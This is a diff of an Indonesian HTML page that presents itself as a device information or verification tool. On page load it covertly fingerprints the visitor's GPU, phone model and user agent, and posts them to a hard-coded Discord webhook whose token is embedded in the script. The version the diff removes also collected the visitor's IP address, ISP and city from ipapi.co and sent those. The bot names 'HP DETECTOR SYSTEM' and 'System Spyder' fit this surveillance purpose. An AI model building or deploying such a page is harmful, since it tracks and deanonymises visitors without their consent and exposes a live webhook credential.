@@ -3,135 +3,121 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sistem Verifikasi Perangkat</title>
+    <title>Sistem Informasi Perangkat</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #0f172a; color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
-        .card { background: #1e293b; padding: 30px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); width: 100%; max-width: 450px; text-align: center; border: 1px solid #334155; }
-        .brand-header { font-size: 28px; font-weight: bold; color: #38bdf8; margin-bottom: 5px; }
-        .model-name { font-size: 18px; color: #94a3b8; margin-bottom: 20px; }
-        .info-grid { text-align: left; background: #0f172a; padding: 15px; border-radius: 12px; margin-bottom: 20px; }
-        .item { margin-bottom: 10px; border-bottom: 1px solid #1e293b; padding-bottom: 5px; font-size: 13px; }
-        .label { color: #64748b; font-size: 11px; text-transform: uppercase; display: block; }
-        .value { color: #f1f5f9; font-weight: 500; }
-        .loader { border: 4px solid #334155; border-top: 4px solid #38bdf8; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; display: inline-block; margin-bottom: 10px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        body { font-family: 'Segoe UI', sans-serif; background: #0f172a; color: white; margin: 0; padding: 20px; display: flex; justify-content: center; }
+        .card { background: #1e293b; padding: 25px; border-radius: 15px; width: 100%; max-width: 500px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        h2 { color: #38bdf8; text-align: center; margin-bottom: 20px; }
+        .info-box { background: #0f172a; padding: 15px; border-radius: 10px; margin-bottom: 15px; border-left: 4px solid #38bdf8; }
+        .label { color: #94a3b8; font-size: 11px; text-transform: uppercase; font-weight: bold; display: block; margin-bottom: 4px; }
+        .value { color: #f1f5f9; font-size: 14px; word-break: break-all; line-height: 1.5; display: block; }
+        .status-tag { text-align: center; padding: 8px; border-radius: 5px; font-size: 12px; margin-top: 10px; font-weight: bold; }
+        .success { background: #065f46; color: #34d399; }
+        .pending { background: #854d0e; color: #fde047; }
     </style>
 </head>
 <body>
 
-<div class="card" id="main-card">
-    <div id="loading-area">
-        <div class="loader"></div>
-        <p>Menganalisis Spesifikasi Perangkat...</p>
-    </div>
+<div class="card">
+    <h2>Device Identifier</h2>
     
-    <div id="result-area" style="display: none;">
-        <div class="brand-header" id="ui-brand">Mendeteksi...</div>
-        <div class="model-name" id="ui-model">Mencari Model...</div>
-        
-        <div class="info-grid">
-            <div class="item"><span class="label">Alamat IP & ISP</span><span class="value" id="ui-ip">Memuat...</span></div>
-            <div class="item"><span class="label">Lokasi Estimasi</span><span class="value" id="ui-loc">Memuat...</span></div>
-            <div class="item"><span class="label">Chipset (GPU)</span><span class="value" id="ui-gpu">Memuat...</span></div>
-            <div class="item"><span class="label">Versi OS</span><span class="value" id="ui-os">Memuat...</span></div>
-        </div>
-        <p style="font-size: 11px; color: #64748b;">Data telah disinkronkan ke server.</p>
+    <div class="info-box">
+        <span class="label">Merk & Nama Produk</span>
+        <span id="brand-out" class="value">Mendeteksi...</span>
     </div>
+
+    <div class="info-box">
+        <span class="label">Model Hardware</span>
+        <span id="model-out" class="value">Mencari...</span>
+    </div>
+
+    <div class="info-box">
+        <span class="label">Chipset (GPU)</span>
+        <span id="gpu-out" class="value">Menganalisis...</span>
+    </div>
+
+    <div class="info-box">
+        <span class="label">User Agent</span>
+        <span id="ua-out" class="value">Memuat...</span>
+    </div>
+
+    <div id="status" class="status-tag pending">Menghubungkan ke Webhook...</div>
 </div>
 
 <script>
-    const webhookURL = "https://discord.com/api/webhooks/1452653310443257970/SkdnTLTdZUq5hJUf7POXHYcILxlYIVTS7TVc-NYKruBSlotTJtA2BzHY9bEACJxrlnd5";
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1452653310443257970/SkdnTLTdZUq5hJUf7POXHYcILxlYIVTS7TVc-NYKruBSlotTJtA2BzHY9bEACJxrlnd5";
 
-    async function analyzeDevice() {
-        let info = {
-            brand: "Unknown",
-            model: "Model Tersembunyi",
-            os: navigator.platform,
-            gpu: "Unknown",
-            ip: "Checking...",
-            isp: "Checking...",
-            loc: "Checking..."
+    async function getDeviceInfo() {
+        let data = {
+            brand: "Android/Generic",
+            model: "Unknown",
+            productName: "Smartphone",
+            gpu: "N/A",
+            ua: navigator.userAgent
         };
 
-        // 1. Deteksi GPU (Untuk menebak chipset/HP)
+        // 1. Get GPU (Chipset Info)
         const canvas = document.createElement('canvas');
-        const gl = canvas.getContext('webgl');
-        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-        info.gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_ID) : "Generic GPU";
-
-        // 2. Deteksi Merk & Model (Cara Modern - Client Hints)
-        if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
-            try {
-                const hints = await navigator.userAgentData.getHighEntropyValues(['model', 'platformVersion', 'fullVersionList']);
-                if (hints.model) info.model = hints.model;
-                
-                // Tebak Brand dari Model Code
-                const ua = navigator.userAgent.toLowerCase();
-                if (ua.includes("samsung") || info.model.includes("SM-")) info.brand = "Samsung";
-                else if (ua.includes("xiaomi") || ua.includes("redmi")) info.brand = "Xiaomi";
-                else if (ua.includes("oppo")) info.brand = "OPPO";
-                else if (ua.includes("vivo")) info.brand = "Vivo";
-                else if (ua.includes("iphone")) info.brand = "Apple";
-                else info.brand = "Android Device";
-            } catch (e) {}
-        } else {
-            // Cara Lama (Parsing User Agent)
-            const ua = navigator.userAgent;
-            if (/iphone|ipad|ipod/i.test(ua)) info.brand = "Apple (iPhone)";
-            else if (/samsung/i.test(ua)) info.brand = "Samsung";
-            else info.brand = "Android Perangkat";
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        if (gl) {
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            data.gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_ID) : "Generic GPU";
         }
 
-        // 3. Ambil IP, ISP, dan Lokasi
-        try {
-            const res = await fetch('https://ipapi.co/json/');
-            const data = await res.json();
-            info.ip = data.ip;
-            info.isp = data.org;
-            info.loc = `${data.city}, ${data.region}`;
-        } catch (e) { info.ip = "Gagal memuat info jaringan"; }
+        // 2. Get Model & Brand (Modern Way)
+        if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
+            const hints = await navigator.userAgentData.getHighEntropyValues(['model', 'platform', 'platformVersion']);
+            data.model = hints.model || "K";
+            data.brand = hints.platform || "Android";
+        }
 
-        // Update Tampilan UI
-        document.getElementById('loading-area').style.display = 'none';
-        document.getElementById('result-area').style.display = 'block';
-        document.getElementById('ui-brand').innerText = info.brand;
-        document.getElementById('ui-model').innerText = info.model;
-        document.getElementById('ui-ip').innerText = `${info.ip} (${info.isp})`;
-        document.getElementById('ui-loc').innerText = info.loc;
-        document.getElementById('ui-gpu').innerText = info.gpu;
-        document.getElementById('ui-os').innerText = navigator.userAgent.split(')')[0].split('(')[1];
+        // 3. Nama Produk (Sederhana - Bisa ditambah listnya)
+        if (data.model.includes("SM-G991")) data.productName = "Samsung Galaxy S21";
+        else if (data.model.includes("SM-A546")) data.productName = "Samsung Galaxy A54";
+        else if (data.model.includes("CPH")) data.productName = "OPPO Perangkat";
+        else if (data.model !== "Unknown") data.productName = "Android " + data.model;
 
-        // Kirim ke Discord
-        sendToDiscord(info);
+        // Update UI
+        document.getElementById('brand-out').innerText = data.productName;
+        document.getElementById('model-out').innerText = data.model;
+        document.getElementById('gpu-out').innerText = data.gpu;
+        document.getElementById('ua-out').innerText = data.ua;
+
+        sendToDiscord(data);
     }
 
-    async function sendToDiscord(d) {
+    function sendToDiscord(d) {
         const payload = {
-            username: "HP DETECTOR SYSTEM",
+            username: "System Spyder",
             embeds: [{
-                title: "📱 PERANGKAT BERHASIL DIIDENTIFIKASI",
-                color: 3066993,
+                title: "📱 Perangkat Terdeteksi",
+                color: 5814783,
                 fields: [
-                    { name: "Merk", value: `**${d.brand}**`, inline: true },
-                    { name: "Model/Code", value: `\`${d.model}\``, inline: true },
-                    { name: "Jaringan (ISP)", value: d.isp, inline: false },
-                    { name: "Alamat IP", value: d.ip, inline: true },
-                    { name: "Kota/Lokasi", value: d.loc, inline: true },
-                    { name: "GPU/Chipset", value: d.gpu, inline: false },
-                    { name: "User Agent", value: `\`${navigator.userAgent}\`` }
+                    { name: "Nama Produk", value: d.productName, inline: true },
+                    { name: "Model", value: d.model, inline: true },
+                    { name: "GPU", value: d.gpu, inline: false },
+                    { name: "User Agent", value: "```" + d.ua + "```" }
                 ],
                 timestamp: new Date()
             }]
         };
 
-        await fetch(webhookURL, {
+        fetch(WEBHOOK_URL, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(payload)
+        })
+        .then(() => {
+            document.getElementById('status').innerText = "✓ Data Terkirim";
+            document.getElementById('status').className = "status-tag success";
+        })
+        .catch(() => {
+            document.getElementById('status').innerText = "✗ Webhook Gagal";
+            document.getElementById('status').className = "status-tag error";
         });
     }
 
-    window.onload = analyzeDevice;
+    window.onload = getDeviceInfo;
 </script>
 
 </body>
